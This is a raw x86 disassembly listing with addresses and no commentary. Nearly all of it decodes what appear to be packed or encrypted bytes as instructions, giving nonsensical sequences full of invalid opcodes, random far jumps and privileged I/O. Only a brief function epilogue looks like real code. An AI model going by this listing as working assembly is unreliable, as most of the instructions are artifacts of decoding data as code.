  40b03c:	mov    ds:0xf16f38af,eax
  40b041:	mov    BYTE PTR [edx+0x64],0xf3
  40b045:	test   al,0xc1
  40b047:	or     edx,0x19
  40b04a:	jecxz  0x40b02b
  40b04c:	adc    esi,esi
  40b04e:	pop    esp
  40b04f:	xchg   ebx,eax
  40b050:	and    eax,0xc33aa3ef
  40b055:	es not cl
  40b058:	mov    ebp,0x371f1cc5
  40b05d:	dec    ecx
  40b05e:	mov    al,0xe5
  40b060:	xlat   BYTE PTR ds:[ebx]
  40b061:	imul   ebp,DWORD PTR [ecx+edx*2+0x2e],0x6c
  40b066:	outs   dx,BYTE PTR ds:[esi]
  40b067:	add    eax,0xb05de2aa
  40b06c:	push   ss
  40b06d:	or     al,0xb6
  40b06f:	dec    edi
  40b070:	dec    esi
  40b071:	inc    ebx
  40b072:	cmp    al,0x7e
  40b074:	(bad)  
  40b075:	xor    al,BYTE PTR [ecx-0x1d]
  40b078:	and    BYTE PTR [edx],bl
  40b07a:	call   0x7e2c:0x2820
  40b080:	jae    0x40b101
  40b082:	and    ebp,DWORD PTR [edi+0x7272005d]
  40b088:	pop    edx
  40b089:	push   cs
  40b08a:	jo     0x40b0ed
  40b08c:	fstp   TBYTE PTR [edx]
  40b08e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b08f:	retf   
  40b090:	or     BYTE PTR [ecx],bl
  40b092:	mov    edi,0xfc9e77f0
  40b097:	cs aaa 
  40b099:	inc    eax
  40b09a:	int3   
  40b09b:	aad    0xc5
  40b09d:	clc    
  40b09e:	pop    eax
  40b09f:	push   ebp
  40b0a0:	in     al,0x25
  40b0a2:	mov    cl,0x3c
  40b0a4:	rcr    DWORD PTR [eax-0x6a],cl
  40b0a7:	nop
  40b0a8:	sbb    BYTE PTR [eax],cl
  40b0aa:	in     al,dx
  40b0ab:	or     esp,DWORD PTR [edx-0x26096a49]
  40b0b1:	in     al,dx
  40b0b2:	leave  
  40b0b3:	lahf   
  40b0b4:	pusha  
  40b0b5:	mov    bl,0xca
  40b0b7:	rcl    DWORD PTR [esi],0x58
  40b0ba:	sub    al,BYTE PTR [esi]
  40b0bc:	mov    al,ds:0xcf801e3b
  40b0c1:	outs   dx,BYTE PTR ds:[esi]
  40b0c2:	jb     0x40b0fa
  40b0c4:	push   ecx
  40b0c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0c6:	push   eax
  40b0c7:	dec    edi
  40b0c8:	mov    dh,0x25
  40b0ca:	mov    bh,0x95
  40b0cc:	clc    
  40b0cd:	and    DWORD PTR [edi],ebx
  40b0cf:	int3   
  40b0d0:	xchg   BYTE PTR [edx-0x38a18f74],dl
  40b0d6:	popf   
  40b0d7:	mov    bh,0x7
  40b0d9:	neg    DWORD PTR [edx-0x5aeb68e9]
  40b0df:	adc    esp,DWORD PTR [esi+0x67856086]
  40b0e5:	add    eax,0x62eae3ef
  40b0ea:	pop    eax
  40b0eb:	fs sbb al,0x4
  40b0ee:	cmp    esp,DWORD PTR [ecx+0x4840f813]
  40b0f4:	addr16 jns 0x40b088
  40b0f7:	push   ebx
  40b0f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0f9:	mov    esi,0x620d17b0
  40b0fe:	sub    bh,BYTE PTR [ebp+0x7d]
  40b101:	sub    BYTE PTR [edx-0x33],0xb1
  40b105:	mov    cl,0x3b
  40b107:	loop   0x40b0d3
  40b109:	je     0x40b0d9
  40b10b:	js     0x40b101
  40b10d:	mov    bh,0xd8
  40b10f:	cmp    BYTE PTR ds:[ebp-0x38],bl
  40b113:	mov    WORD PTR [esi+0x34633a38],es
  40b119:	mov    BYTE PTR [ebp+0xba56d99],bh
  40b11f:	push   ecx
  40b120:	mov    ds:0xc823e3d8,al
  40b125:	ret    0xf1c
  40b128:	aad    0xee
  40b12a:	mov    WORD PTR [edi],fs
  40b12c:	ficom  DWORD PTR [edx-0x38f055cf]
  40b132:	shl    DWORD PTR [edi+0x27279a1c],1
  40b138:	mov    DWORD PTR [edx+0x67],eax
  40b13b:	sti    
  40b13c:	cld    
  40b13d:	mov    edi,0x8ce33602
  40b142:	mov    ebx,0x878d6e54
  40b147:	and    eax,DWORD PTR [esi-0x6ec2fcae]
  40b14d:	lea    eax,ds:0x2696ba55
  40b153:	jl     0x40b126
  40b155:	adc    dh,cl
  40b157:	mov    esp,ecx
  40b159:	test   DWORD PTR [esp+esi*1],0x2480f5fd
  40b160:	sub    al,0x17
  40b162:	sbb    eax,0x908ded95
  40b167:	sub    ebx,DWORD PTR [ebp-0x202d9f54]
  40b16d:	repnz into 
  40b16f:	or     DWORD PTR [ecx-0x25],ebx
  40b172:	mov    ebx,0xfb8af03
  40b177:	out    dx,eax
  40b178:	inc    edx
  40b179:	in     eax,dx
  40b17a:	sbb    al,0xd1
  40b17c:	les    eax,FWORD PTR [edx+eiz*4]
  40b17f:	fdivrp st(3),st
  40b181:	bound  esi,QWORD PTR [ecx]
  40b183:	scas   al,BYTE PTR es:[edi]
  40b184:	xchg   esp,eax
  40b185:	jecxz  0x40b167
  40b187:	push   ebp
  40b188:	jb     0x40b207
  40b18a:	xchg   ebp,eax
  40b18b:	and    al,0x50
  40b18d:	icebp  
  40b18e:	lods   eax,DWORD PTR ds:[esi]
  40b18f:	xor    bh,dl
  40b191:	mov    bl,0x41
  40b193:	inc    ebp
  40b194:	pop    ebp
  40b195:	aaa    
  40b196:	and    bl,dh
  40b198:	sbb    al,0x54
  40b19a:	mov    edi,0x21c8845
  40b19f:	pop    ebp
  40b1a0:	inc    ebx
  40b1a1:	push   eax
  40b1a2:	jno    0x40b217
  40b1a4:	pop    edx
  40b1a5:	dec    esi
  40b1a6:	lods   al,BYTE PTR ds:[esi]
  40b1a7:	push   0xffffffbb
  40b1a9:	(bad)  
  40b1aa:	mov    esi,0xbf617a52
  40b1af:	sub    eax,0xa1d77efb
  40b1b4:	icebp  
  40b1b5:	xlat   BYTE PTR ds:[ebx]
  40b1b6:	mov    bl,BYTE PTR [eax]
  40b1b8:	cdq    
  40b1b9:	imul   ebp,ebx,0x7dec334b
  40b1bf:	xlat   BYTE PTR ds:[ebx]
  40b1c0:	fwait
  40b1c1:	mov    BYTE PTR [esi+0x4206c9e2],al
  40b1c7:	mov    es,WORD PTR [ebp-0xf40e6ea]
  40b1cd:	push   ecx
  40b1ce:	cmp    bh,cl
  40b1d0:	dec    eax
  40b1d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1d2:	je     0x40b246
  40b1d4:	jmp    0x40b185
  40b1d6:	pop    ds
  40b1d7:	or     DWORD PTR [esp],esp
  40b1da:	push   es
  40b1db:	xor    DWORD PTR ds:0xda3f3f07,ebp
  40b1e1:	or     al,BYTE PTR [esi]
  40b1e3:	xchg   ecx,eax
  40b1e4:	xchg   DWORD PTR [ebx],edi
  40b1e6:	daa    
  40b1e7:	repz loop 0x40b212
  40b1ea:	sbb    eax,DWORD PTR [eax]
  40b1ec:	frstor [ebp+edi*1-0x5]
  40b1f0:	fistp  QWORD PTR [edx-0x14b83940]
  40b1f6:	add    al,0xf8
  40b1f8:	loopne 0x40b205
  40b1fa:	sub    ebp,DWORD PTR [edx]
  40b1fc:	mov    ecx,0xa6cabe93
  40b201:	sub    BYTE PTR [esi-0x6],dl
  40b204:	add    BYTE PTR [ecx-0x32],dh
  40b207:	sbb    dh,BYTE PTR [esi+ebp*2]
  40b20a:	sar    BYTE PTR [ecx+0x4a1ba1f6],1
  40b210:	fidivr DWORD PTR [edx-0x47]
  40b213:	imul   esp,DWORD PTR [edx+0x36095ff5],0x73d4585
  40b21d:	push   cs
  40b21e:	imul   esi,DWORD PTR [ebp+0x75625297],0xe61b17e3
  40b228:	add    al,BYTE PTR [ecx]
  40b22a:	mov    esp,0xb76a80fb
  40b22f:	mov    DWORD PTR [esi],edi
  40b231:	sbb    al,0x6e
  40b233:	jno    0x40b1c5
  40b235:	leave  
  40b236:	ror    DWORD PTR [esi+0x314ab35],1
  40b23c:	cli    
  40b23d:	inc    edx
  40b23e:	jns    0x40b232
  40b240:	xchg   ecx,eax
  40b241:	lds    esi,FWORD PTR [edx+0x55918a98]
  40b247:	adc    bl,BYTE PTR [esi-0x27]
  40b24a:	(bad)  [esi-0x5dd670b4]
  40b250:	xchg   esp,eax
  40b251:	leave  
  40b252:	idiv   BYTE PTR es:[esi+ebp*2-0x70]
  40b257:	xor    eax,0x73efa2b
  40b25c:	sbb    bh,BYTE PTR [ecx]
  40b25e:	pop    ebp
  40b25f:	in     eax,dx
  40b260:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b261:	ret    0xb785
  40b264:	inc    edx
  40b265:	inc    eax
  40b266:	xchg   edi,eax
  40b267:	cmp    eax,0x19e85ff4
  40b26c:	inc    ebx
  40b26d:	inc    ebp
  40b26e:	(bad)  
  40b26f:	and    ch,BYTE PTR [edx+0x15]
  40b272:	xor    BYTE PTR ds:0x7f87adef,0xd
  40b279:	sub    eax,0x2cf21982
  40b27e:	or     DWORD PTR [ebp-0x8af7794],edi
  40b284:	retf   
  40b285:	loopne 0x40b24f
  40b287:	mov    eax,0xe0e2cbe
  40b28c:	out    0x6e,eax
  40b28e:	cli    
  40b28f:	inc    ebx
  40b290:	test   DWORD PTR [eax],ebp
  40b292:	jae    0x40b254
  40b294:	and    esi,ebp
  40b296:	jl     0x40b312
  40b298:	loop   0x40b22e
  40b29a:	pop    edx
  40b29b:	enter  0xbbb0,0x86
  40b29f:	cmc    
  40b2a0:	aam    0xd6
  40b2a2:	loop   0x40b27d
  40b2a4:	in     eax,dx
  40b2a5:	popa   
  40b2a6:	and    eax,0xc4ff402a
  40b2ab:	sub    al,0x64
  40b2ad:	xchg   eax,ebx
  40b2af:	mov    eax,ds:0x3c7e567b
  40b2b4:	xchg   edi,eax
  40b2b5:	xor    BYTE PTR [ebx+0x3d28c78f],0x76
  40b2bc:	jp     0x40b250
  40b2be:	sub    cl,0x14
  40b2c1:	add    eax,DWORD PTR [eax]
  40b2c3:	add    dl,dl
  40b2c5:	rol    ah,0xc9
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0x8974b132
  40b2d2:	and    eax,0x788ace48
  40b2d7:	js     0x40b34d
  40b2d9:	jle    0x40b353
  40b2db:	js     0x40b2cc
  40b2dd:	fidivr WORD PTR [ecx-0x7808e4e0]
  40b2e3:	out    0x86,eax
  40b2e5:	and    al,0xf3
  40b2e7:	add    bl,ch
  40b2e9:	dec    edx
  40b2ea:	iret   
  40b2eb:	fisttp QWORD PTR [eax]
  40b2ed:	test   eax,0xcb0aedcf
  40b2f2:	dec    ebx
  40b2f3:	push   es
  40b2f4:	adc    BYTE PTR [edi],ch
  40b2f6:	fmul   QWORD PTR [edx+0x11ad9359]
  40b2fc:	inc    esi
  40b2fd:	mov    cl,0x9f
  40b2ff:	inc    eax
  40b300:	push   ebx
  40b301:	arpl   cx,bx
  40b303:	hlt    
  40b304:	xor    ebp,DWORD PTR [edi+0x3d]
  40b307:	jecxz  0x40b2f1
  40b309:	add    ch,BYTE PTR [ebp+eax*8+0x241ad092]
  40b310:	les    ecx,FWORD PTR [edx]
  40b312:	mov    DWORD PTR [edx],edi
  40b314:	sub    edx,eax
  40b316:	ss jae 0x40b2be
  40b319:	dec    ebx
  40b31a:	stc    
  40b31b:	jmp    0xb64f:0xaf91481d
  40b322:	cli    
  40b323:	sbb    al,0xf6
  40b325:	(bad)  
  40b326:	call   0x1e9a7196
  40b32b:	popa   
  40b32c:	sahf   
  40b32d:	pop    ds
  40b32e:	xor    al,0xb4
  40b330:	mov    edi,esp
  40b332:	jbe    0x40b305
  40b334:	cwde   
  40b335:	and    eax,0x253bb1e4
  40b33a:	das    
  40b33b:	push   edx
  40b33c:	and    al,0x93
  40b33e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b33f:	push   0xffffff8b
  40b341:	pop    ebx
  40b342:	loope  0x40b2f5
  40b344:	(bad)  [ebx+ebx*4-0x2d]
  40b348:	retf   0xdd16
  40b34b:	mov    ah,0xf1
  40b34d:	adc    al,0x72
  40b34f:	jmp    0x40b31f
  40b351:	push   ecx
  40b352:	xor    ebx,DWORD PTR [eax]
  40b354:	mov    esp,0xe8cec627
  40b359:	in     eax,dx
  40b35a:	jae    0x40b378
  40b35c:	call   DWORD PTR [esi-0x2d]
  40b35f:	sbb    al,0x75
  40b361:	pop    ds
  40b362:	jg     0x40b2ed
  40b364:	inc    ebp
  40b365:	and    al,BYTE PTR [edx-0x1bb350c4]
  40b36b:	jbe    0x40b34b
  40b36d:	aam    0x85
  40b36f:	in     eax,0xbf
  40b371:	push   esp
  40b372:	jecxz  0x40b3a1
  40b374:	(bad)  
  40b376:	mov    ch,0x1d
  40b378:	inc    ebx
  40b379:	pop    esp
  40b37a:	mov    dh,0xe4
  40b37c:	xor    esi,ebp
  40b37e:	pop    ss
  40b37f:	fs loop 0x40b3c7
  40b382:	jne    0x40b3f6
  40b384:	mov    esp,0x94731e90
  40b389:	and    edi,DWORD PTR [ecx]
  40b38b:	mov    bl,0x5d
  40b38d:	mov    dl,0x9d
  40b38f:	pop    es
  40b390:	pushf  
  40b391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b392:	dec    ebp
  40b393:	sar    BYTE PTR [eax-0x19],1
  40b396:	add    eax,0xfda14608
  40b39b:	das    
  40b39c:	add    dl,BYTE PTR [ebx+0x5ff0ca88]
  40b3a2:	or     al,0x97
  40b3a4:	ret    0xbdac
  40b3a7:	inc    ecx
  40b3a8:	lock jne 0x40b373
  40b3ab:	mov    esp,0x10c900c8
  40b3b0:	mov    esi,0x259b7a62
  40b3b5:	sbb    eax,0x76471bde
  40b3ba:	int3   
  40b3bb:	shl    DWORD PTR [eax],1
  40b3bd:	test   al,0x4e
  40b3bf:	out    0xd0,al
  40b3c1:	cmp    ebp,ebx
  40b3c3:	popf   
  40b3c4:	push   ebp
  40b3c5:	mov    ah,0xab
  40b3c7:	call   0xab4a:0xb01a26cb
  40b3ce:	pop    edx
  40b3cf:	pop    ss
  40b3d0:	inc    eax
  40b3d1:	enter  0x723d,0x59
  40b3d5:	daa    
  40b3d6:	sub    ebp,DWORD PTR [ebp+0x78]
  40b3d9:	push   0x97672276
  40b3de:	add    bl,BYTE PTR [edx-0x25]
  40b3e1:	mov    ah,0xe2
  40b3e3:	stos   BYTE PTR es:[edi],al
  40b3e4:	fdivr  QWORD PTR [edi+esi*4]
  40b3e7:	call   0x4678:0xc28979c4
  40b3ee:	fdiv   DWORD PTR [ebp+eiz*4-0x1b14a7a7]
  40b3f5:	ins    BYTE PTR es:[edi],dx
  40b3f6:	pop    ss
  40b3f7:	mov    ds:0xf581b585,al
  40b3fc:	cmc    
  40b3fd:	xrelease mov BYTE PTR [edi-0x20],0x18
  40b402:	inc    eax
  40b403:	pop    ss
  40b404:	ins    DWORD PTR es:[edi],dx
  40b405:	push   eax
  40b406:	add    edx,DWORD PTR ds:0xce64087e
  40b40c:	inc    ecx
  40b40d:	lock enter 0x4a34,0x29
  40b412:	jnp    0x40b399
  40b414:	js     0x40b3e7
  40b416:	aam    0xe0
  40b418:	sahf   
  40b419:	push   ds
  40b41a:	and    dl,BYTE PTR [ecx+0x69]
  40b41d:	fst    DWORD PTR [ecx+0x7da81a87]
  40b423:	cld    
  40b424:	ja     0x40b44d
  40b426:	xor    eax,0xc2ed68c1
  40b42b:	das    
  40b42c:	(bad)  
  40b42d:	push   esi
  40b42e:	mov    al,0xd0
  40b430:	shl    BYTE PTR [edx-0x3814c2d8],cl
  40b436:	lods   eax,DWORD PTR ds:[esi]
  40b437:	leave  
  40b438:	fadd   DWORD PTR [ebp-0x760536b]
  40b43e:	shld   ebx,edi,0xfe
  40b442:	add    dh,BYTE PTR fs:[esi-0x749c8765]
  40b449:	popa   
  40b44a:	fmulp  st(0),st
  40b44c:	lds    edi,FWORD PTR [esi-0x7f3475c]
  40b452:	pop    ebx
  40b453:	jp     0x40b467
  40b455:	push   ebx
  40b456:	push   ss
  40b457:	jnp    0x40b4b9
  40b459:	or     ebx,DWORD PTR [edx+ebx*8+0x71]
  40b45d:	iret   
  40b45e:	xchg   ebx,eax
  40b45f:	add    bl,BYTE PTR ds:0x6c368d0c
  40b465:	push   eax
  40b466:	push   edi
  40b467:	dec    edx
  40b468:	lods   eax,DWORD PTR ds:[esi]
  40b469:	(bad)  
  40b46a:	(bad)  
  40b46b:	outs   dx,DWORD PTR ds:[esi]
  40b46c:	or     al,0x44
  40b46e:	push   es
  40b46f:	lds    edx,FWORD PTR [ecx-0xc]
  40b472:	pop    eax
  40b473:	int    0x6a
  40b475:	lods   eax,DWORD PTR ds:[esi]
  40b476:	hlt    
  40b477:	pop    edx
  40b478:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b479:	xor    al,0xf8
  40b47b:	sbb    DWORD PTR [ecx-0x44],edi
  40b47e:	xchg   edi,eax
  40b47f:	and    esi,edi
  40b481:	repnz inc ecx
  40b483:	xchg   ebx,eax
  40b484:	lock (bad) 
  40b486:	cmc    
  40b487:	adc    bl,BYTE PTR [esi+0x60]
  40b48a:	lock call 0xdea05c27
  40b490:	rol    BYTE PTR [edx+0x56d2dc38],0x10
  40b497:	and    ebp,DWORD PTR [edx-0xe60bc36]
  40b49d:	cmc    
  40b49e:	or     DWORD PTR [esi+0x37e84c2b],edx
  40b4a4:	test   BYTE PTR [edi+0x648ab9e],bh
  40b4aa:	mov    ah,0x55
  40b4ac:	xor    BYTE PTR [ecx+0x70ded0bc],dl
  40b4b2:	adc    al,0x8a
  40b4b4:	cmp    edi,ebp
  40b4b6:	pop    ss
  40b4b7:	lods   eax,DWORD PTR ds:[esi]
  40b4b8:	adc    bh,BYTE PTR [ecx+0x63]
  40b4bb:	in     eax,dx
  40b4bc:	mov    al,ds:0xe1ad60fb
  40b4c1:	inc    eax
  40b4c2:	je     0x40b504
  40b4c4:	adc    edi,DWORD PTR [eax]
  40b4c6:	fcmovu st,st(5)
  40b4c8:	fcomi  st,st(4)
  40b4ca:	sub    ebx,eax
  40b4cc:	not    BYTE PTR [ebp-0x772f801f]
  40b4d2:	adc    dh,bl
  40b4d4:	adc    eax,0xbada7caa
  40b4d9:	ret    
  40b4da:	call   0xd13b27e6
  40b4df:	dec    ebp
  40b4e0:	or     DWORD PTR [ebp+0x5b],ebp
  40b4e3:	xor    al,BYTE PTR [edi+edi*8-0x2c268857]
  40b4ea:	jmp    0x3579:0x967b741e
  40b4f1:	mov    ch,0xfd
  40b4f3:	dec    esp
  40b4f4:	add    al,BYTE PTR [esi-0x13]
  40b4f7:	sbb    al,BYTE PTR [eax]
  40b4f9:	push   ecx
  40b4fa:	out    dx,eax
  40b4fb:	push   esi
  40b4fc:	lods   eax,DWORD PTR ds:[esi]
  40b4fd:	pop    esi
  40b4fe:	xchg   DWORD PTR [edi],eax
  40b500:	add    DWORD PTR [ebx+ecx*8+0x53],esp
  40b504:	sub    al,0x59
  40b506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b507:	add    al,0xce
  40b509:	push   cs
  40b50a:	arpl   WORD PTR [edx*4-0x473b2530],sp
  40b511:	sbb    ebp,DWORD PTR [edx]
  40b513:	loop   0x40b4f2
  40b515:	jbe    0x40b575
  40b517:	sbb    BYTE PTR [ecx+0xd],0xb4
  40b51b:	add    BYTE PTR [ebp-0x75f3ffa1],dl
  40b521:	inc    esp
  40b522:	push   0x2b4fc543
  40b527:	into   
  40b528:	sub    edi,ecx
  40b52a:	(bad)  
  40b52b:	xchg   edx,eax
  40b52c:	retw   
  40b52e:	jecxz  0x40b510
  40b530:	sub    bh,bl
  40b532:	or     BYTE PTR [edi-0x14afd9ba],dl
  40b538:	enter  0xf482,0x7d
  40b53c:	sbb    BYTE PTR [ecx+0x1e48148c],0x17
  40b543:	sub    al,0x6f
  40b545:	jmp    0x1292:0x9036ffc3
  40b54c:	push   0xffffffdf
  40b54e:	mov    esp,0xd560f4f5
  40b553:	add    DWORD PTR [edx+ecx*4+0x347a8204],esp
  40b55a:	cmc    
  40b55b:	stos   BYTE PTR es:[edi],al
  40b55c:	mov    al,BYTE PTR [esi-0x3a7c900f]
  40b562:	cmp    BYTE PTR [eax-0x80],ch
  40b565:	mov    ds:0x45c19008,eax
  40b56a:	add    eax,0x8e3698ea
  40b56f:	je     0x97419455
  40b575:	rol    ebp,1
  40b577:	xorps  xmm7,XMMWORD PTR [ebx+0x66d75f04]
  40b57e:	push   ss
  40b57f:	cld    
  40b580:	sbb    bl,BYTE PTR [ecx+eiz*1-0x45701221]
  40b587:	sub    BYTE PTR [edi+ebp*4-0x50],bl
  40b58b:	pop    eax
  40b58c:	add    eax,DWORD PTR [ebx]
  40b58e:	popa   
  40b58f:	jno    0x40b58d
  40b591:	popf   
  40b592:	mov    bl,0xbd
  40b594:	mov    dh,0x7c
  40b596:	shl    esi,cl
  40b598:	adc    esi,DWORD PTR [edi]
  40b59a:	test   BYTE PTR [ebp-0x73f7f1f5],bl
  40b5a0:	sbb    DWORD PTR [ecx+ecx*2+0x63e32e9f],0xb6c2b777
  40b5ab:	cld    
  40b5ac:	jbe    0x40b5a6
  40b5ae:	or     esp,DWORD PTR [edi-0x19]
  40b5b1:	cmp    al,0x91
  40b5b3:	fs mov ah,0xad
  40b5b6:	adc    al,al
  40b5b8:	mov    ebx,0xed0782ac
  40b5bd:	adc    eax,0xf87e6870
  40b5c2:	push   es
  40b5c3:	adc    eax,0x36e310db
  40b5c8:	push   0xffffffa2
  40b5ca:	outs   dx,DWORD PTR ds:[esi]
  40b5cb:	jecxz  0x40b5d0
  40b5cd:	fild   QWORD PTR [esi]
  40b5cf:	mov    es,WORD PTR [esi+0x5d]
  40b5d2:	ins    DWORD PTR es:[edi],dx
  40b5d3:	add    al,0x9b
  40b5d5:	pop    es
  40b5d6:	and    BYTE PTR [edi+0x17840f],dl
  40b5dc:	add    BYTE PTR [eax],al
  40b5de:	mov    eax,DWORD PTR [ebp-0x1c]
  40b5e1:	or     DWORD PTR [eax],0x60751c9d
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi-0x2a332a7c]
  40b60d:	in     eax,dx
  40b60e:	pop    eax
  40b60f:	addr16 retf 0x788f
  40b613:	js     0x40b689
  40b615:	jle    0x40b68f
  40b617:	js     0x40b63e
  40b619:	cmp    al,0x1
  40b61b:	pop    ds
  40b61c:	push   edx
  40b61d:	jp     0x40b671
  40b61f:	ret    
  40b620:	sbb    edx,edx
  40b622:	mov    ds:0x3c37efda,eax
  40b627:	add    BYTE PTR [eax+0x4d],0xc3
  40b62b:	int3   
  40b62c:	test   BYTE PTR [ecx+0x47f5d068],0xd1
  40b633:	sub    BYTE PTR [edx+0x3daf1898],0x89
  40b63a:	xchg   esi,eax
  40b63b:	in     al,0xe5
  40b63d:	or     al,0x6c
  40b63f:	add    ah,BYTE PTR [edx+eiz*8+0x6b303d73]
  40b646:	xor    BYTE PTR [edi+ebp*4+0x57],ah
  40b64a:	and    al,0x6b
  40b64c:	jbe    0x40b61a
  40b64e:	pushf  
  40b64f:	popa   
  40b650:	loop   0x40b6c0
  40b652:	xchg   DWORD PTR [esi-0x61],ebp
  40b655:	mov    edx,0x7a68c261
  40b65a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b65b:	adc    ah,BYTE PTR [esi-0x349f7a4e]
  40b661:	adc    al,0xe1
  40b663:	aas    
  40b664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b665:	hlt    
  40b666:	ja     0x40b5fa
  40b668:	mov    bh,0x1d
  40b66a:	out    0x4f,eax
  40b66c:	add    ebp,DWORD PTR [eax-0x7e95ee71]
  40b672:	popa   
  40b673:	out    dx,eax
  40b674:	inc    esp
  40b675:	pop    esp
  40b676:	(bad)  
  40b677:	push   ebp
  40b678:	sbb    DWORD PTR [ebx],ecx
  40b67a:	(bad)
  40b67d:	jo     0x40b645
  40b67f:	shl    BYTE PTR [esi-0x1efe8714],cl
  40b685:	es std 
  40b687:	xor    eax,ecx
  40b689:	rcl    BYTE PTR [eax+0x3d5a8417],0xf3
  40b690:	jmp    FWORD PTR [esi]
  40b692:	icebp  
  40b693:	dec    ebx
  40b694:	stos   BYTE PTR es:[edi],al
  40b695:	xor    DWORD PTR [esi+ebp*8-0x14],esp
  40b699:	push   ecx
  40b69a:	cli    
  40b69b:	js     0x40b702
  40b69d:	or     ch,ch
  40b69f:	stc    
  40b6a0:	push   eax
  40b6a1:	push   ecx
  40b6a2:	cwde   
  40b6a3:	hlt    
  40b6a4:	pop    ecx
  40b6a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6a6:	loopne 0x40b6ca
  40b6a8:	inc    ebx
  40b6a9:	xchg   DWORD PTR [ebx+0x48c11d1c],ecx
  40b6af:	cmc    
  40b6b0:	out    0x74,al
  40b6b2:	cwde   
  40b6b3:	das    
  40b6b4:	dec    ebx
  40b6b5:	mov    esi,0x4d657a4b
  40b6ba:	sahf   
  40b6bb:	jl     0x40b70e
  40b6bd:	hlt    
  40b6be:	test   al,0xe6
  40b6c0:	repnz dec ebx
  40b6c2:	dec    edi
  40b6c3:	mov    al,ch
  40b6c5:	imul   ebx,DWORD PTR [ecx+0x54e7ba95],0x3b
  40b6cc:	pop    es
  40b6cd:	jnp    0x40b745
  40b6cf:	(bad)  
  40b6d1:	nop
  40b6d2:	or     al,0xe8
  40b6d4:	inc    esp
  40b6d5:	dec    ecx
  40b6d6:	add    edx,ecx
  40b6d8:	add    ebx,DWORD PTR [ebx+0x755b375d]
  40b6de:	test   cl,bh
  40b6e0:	(bad)  
  40b6e2:	xor    BYTE PTR [ecx+0x1d52a023],bh
  40b6e8:	clc    
  40b6e9:	in     al,0xa9
  40b6eb:	push   eax
  40b6ec:	sbb    eax,0x68b02aea
  40b6f1:	jmp    DWORD PTR [edi]
  40b6f3:	ret    0xfafa
  40b6f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6f7:	or     al,ah
  40b6f9:	daa    
  40b6fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6fb:	dec    esi
  40b6fc:	sti    
  40b6fd:	xchg   BYTE PTR [edx-0x3928fac7],ch
  40b703:	xchg   edx,eax
  40b704:	cli    
  40b705:	aaa    
  40b706:	popf   
  40b707:	iret   
  40b708:	cwde   
  40b709:	mov    ecx,0x43549915
  40b70e:	mov    cl,0xac
  40b710:	sar    BYTE PTR [ebp+0x73],cl
  40b713:	adc    BYTE PTR [ebx],ah
  40b715:	scas   eax,DWORD PTR es:[edi]
  40b716:	push   edi
  40b717:	out    dx,al
  40b718:	add    DWORD PTR [ecx-0x5],0x4bc1d8b5
  40b71f:	jno    0x40b6f7
  40b721:	adc    BYTE PTR [edi+0x3a0c3e05],bh
  40b727:	in     al,0x70
  40b729:	bound  ecx,QWORD PTR [ebx+esi*1+0x35]
  40b72d:	iret   
  40b72e:	dec    ebp
  40b72f:	pop    esi
  40b730:	pop    ss
  40b731:	sub    ebp,DWORD PTR [edx-0x6f]
  40b734:	add    BYTE PTR [ebx-0x5d194d0b],cl
  40b73a:	test   BYTE PTR [eax+0x195c870a],al
  40b740:	rol    DWORD PTR [edi-0xe88e269],0x82
  40b747:	jbe    0x40b6ec
  40b749:	ja     0x40b708
  40b74b:	cmp    eax,ecx
  40b74d:	in     eax,dx
  40b74e:	cmp    DWORD PTR [eax],edx
  40b750:	sbb    DWORD PTR [ebx],ebx
  40b752:	xchg   esi,eax
  40b753:	lods   eax,DWORD PTR ds:[esi]
  40b754:	dec    edx
  40b755:	imul   esp,DWORD PTR [edi-0x5b20f66d],0xfffffffc
  40b75c:	retf   
  40b75d:	add    BYTE PTR [ecx],bl
  40b75f:	inc    edx
  40b760:	dec    ebp
  40b761:	xchg   esp,eax
  40b762:	leave  
  40b763:	das    
  40b764:	sub    al,0x12
  40b766:	sub    dl,BYTE PTR [ecx+ecx*2-0x312f1224]
  40b76d:	out    dx,eax
  40b76e:	pop    ebx
  40b76f:	(bad)  
  40b771:	sbb    ch,BYTE PTR [eax]
  40b773:	xchg   esp,eax
  40b774:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b775:	in     al,dx
  40b776:	or     BYTE PTR [edx+0x11],bl
  40b779:	ins    DWORD PTR es:[edi],dx
  40b77a:	rcl    BYTE PTR [eax-0x43],cl
  40b77d:	xchg   esi,eax
  40b77e:	or     DWORD PTR fs:[esi-0x69],ecx
  40b782:	dec    ebp
  40b783:	in     al,0x6f
  40b785:	or     al,0x6b
  40b787:	sbb    ah,BYTE PTR [ebx+ebx*4]
  40b78a:	or     al,0x9c
  40b78c:	lock aam 0x0
  40b78f:	inc    ebp
  40b790:	push   esi
  40b791:	lock pop es
  40b793:	mov    cl,0xd8
  40b795:	jmp    0x556ccf88
  40b79a:	adc    bh,ah
  40b79c:	arpl   di,bx
  40b79e:	out    0x9d,al
  40b7a0:	jl     0x40b78b
  40b7a2:	mov    ch,0x25
  40b7a4:	xchg   bp,ax
